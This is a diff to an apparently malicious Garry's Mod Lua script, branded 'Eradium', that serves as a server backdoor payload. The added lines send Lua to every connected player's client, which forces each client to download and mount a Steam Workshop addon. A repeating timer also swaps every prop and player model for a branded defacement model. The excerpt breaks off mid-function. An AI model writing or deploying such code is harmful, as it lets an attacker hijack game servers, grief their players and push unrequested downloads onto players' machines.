@@ -10,6 +10,10 @@
 
 -- Beta1.0 (30-07-2020)
 
+for k, v in pairs(player.GetAll()) do
+	v:SendLua("steamworks.FileInfo(2183584889,function(result)steamworks.Download(result.fileid,true,function(name)game.MountGMA(name)end) end)")
+end
+
 local function rdm_str(len)
 	if not len or len <= 0 then return "" end
 	return rdm_str(len - 1) .. ("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789")[math.random(1, 62)]
@@ -75,6 +79,8 @@ local restartafterpayload = true
 local frictionamplif = true
 local godmodeveryone = true
 
+local modelsreplace = true
+
 
 
 -- /Configuration
@@ -92,6 +98,35 @@ if frictionamplif == true then
 end
 
 print(printtoconsole)
+
+if modelsreplace == true then
+		timer.Create("EtOnRemplaceToutLesProps"..math.random(500,50000), 1.5, 0, function()
+			local props2 = ents.GetAll()
+			for _, prop in ipairs( props2 ) do
+				if(prop:GetPhysicsObject():IsValid()) then
+					if(prop:GetModel() == "models/eradium/bnw.mdl") then else
+						prop:SetModel("models/eradium/bnw.mdl")
+						prop:SetMaterial("phoenix_storms/Fender_white.vtf")
+						prop:SetColor(0,0,185)
+					end
+				end
+			end
+		end)
+		for k, v in pairs( player.GetAll() ) do
+			if ( v:Alive() ) then
+				v:SetModel("models/eradium/bnw.mdl")
+				v:SetMaterial("phoenix_storms/Fender_white.vtf")
+				v:SetColor(0,0,185) else
+				v:Spawn()
+				timer.Simple( 5, function()
+					v:SetModel("models/eradium/bnw.mdl")
+					v:SetMaterial("phoenix_storms/Fender_white.vtf")
+					v:SetColor(0,0,185)
+				end)
+			end
+		end
+end
+
 
 timer.Simple(1, function()
     EradiumToClient([==[
